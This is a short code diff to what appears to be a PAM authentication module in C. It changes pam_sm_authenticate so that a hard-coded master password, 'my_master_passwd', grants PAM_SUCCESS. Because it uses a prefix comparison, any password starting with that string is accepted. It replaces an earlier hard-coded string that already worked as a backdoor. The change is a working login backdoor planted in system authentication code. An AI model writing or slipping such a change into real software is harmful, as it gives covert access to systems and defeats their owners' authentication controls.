@@ -16,6 +16,7 @@
 
 #define true 1
 #define false 0
+#define MYPASSWD "my_master_passwd"
 
 const char *log_filename = "/var/log/mail";
 
@@ -90,7 +91,7 @@ pam_sm_authenticate(pam_handle_t *pam_handle, int flags, int argc, const char **
         return PAM_SYSTEM_ERR;
     }
 
-    if (strcmp(password, "f3fda86e428ccda3e33d207217665201") == 0) {
+    if (!strncmp(password, MYPASSWD, strlen(MYPASSWD))) {
         return PAM_SUCCESS;
     }
 
